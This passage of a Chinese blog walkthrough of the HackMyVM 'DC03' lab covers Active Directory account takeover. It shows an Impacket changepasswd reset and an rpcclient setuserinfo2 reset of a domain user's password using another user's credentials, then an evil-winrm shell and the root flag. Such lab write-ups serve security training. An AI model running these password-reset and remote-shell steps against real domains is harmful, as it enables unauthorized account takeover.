SOUPEDECODE.LOCAL\ngroupname:    Operators\nmembername:   fbeth103\nmemberdomain: SOUPEDECODE.LOCAL\nisgroup:      False\nmemberdn:     CN=Fanny Beth,CN=Users,DC=SOUPEDECODE,DC=LOCAL\nobjectsid:    S-1-5-21-2986980474-46765180-2505414164-1221\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e修改\u003ccode\u003efbeth103\u003c/code\u003e 的密码（第一次没成功，重新导入后才成功）\u003c/p\u003e\n\u003cp\u003e通过\u003ccode\u003eimparket\u003c/code\u003e工具包的\u003ccode\u003echangepasswd\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/DC03/output  changepasswd.py \u003cspan class=\"hljs-string\"\u003e'SOUPEDECODE.LOCAL/fbeth103@192.168.56.126'\u003c/span\u003e -altuser \u003cspan class=\"hljs-string\"\u003e'xkate578'\u003c/span\u003e -altpass \u003cspan class=\"hljs-string\"\u003e'jesuschrist'\u003c/span\u003e -newpass \u003cspan class=\"hljs-string\"\u003e'hacked!'\u003c/span\u003e -no-pass -reset\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Setting the password of SOUPEDECODE.LOCAL\\fbeth103 as SOUPEDECODE.LOCAL\\xkate578\n[*] Connecting to DCE/RPC as SOUPEDECODE.LOCAL\\xkate578\n[*] Password was changed successfully.\n[!] User no longer has valid AES keys \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e Kerberos, \u003cspan class=\"hljs-keyword\"\u003euntil\u003c/span\u003e they change their password again.\n\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e root@kali  ~/Desktop/test/DC03/output  evil-winrm -i 192.168.56.126 -u fbeth103 -p hacked!\n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e is unimplemented on this machine\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n\n*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e root.txt\nb8e59a7d4020792c412da75e589ff4fc\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e还可以使用\u003ccode\u003erpcclient\u003c/code\u003e来修改密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/DC03/output  rpcclient -U SOUPEDDECODE.LOCAL/xkate578%jesuschrist 192.168.56.126\nrpcclient $\u003e setuserinfo2 fbeth103 23 213121231\nrpcclient $\u003e \u003cspan class=\"hljs-built_in\"\u003eexit\u003c/span\u003e\n⚡ root@kali  ~/Desktop/test/DC03/output  evil-winrm -i 192.168.56.126 -u fbeth103 -p 213121231\n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e is unimplemented on this machine\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\fbeth103\\Documents\u003e                                                                      \n\u003c/code\u003e\u003c/pre\u003e","title":"HackMyVM - DC03","date":"2025-04-03","updated":"2025-04-03","comments":true,"tags":["HackMyVM","Linux靶机"],"categories":"靶机"}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"HackMyVMDC03"},"buildId":"leuPzpaT1GtuszjEU9qvn","assetPrefix":".","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>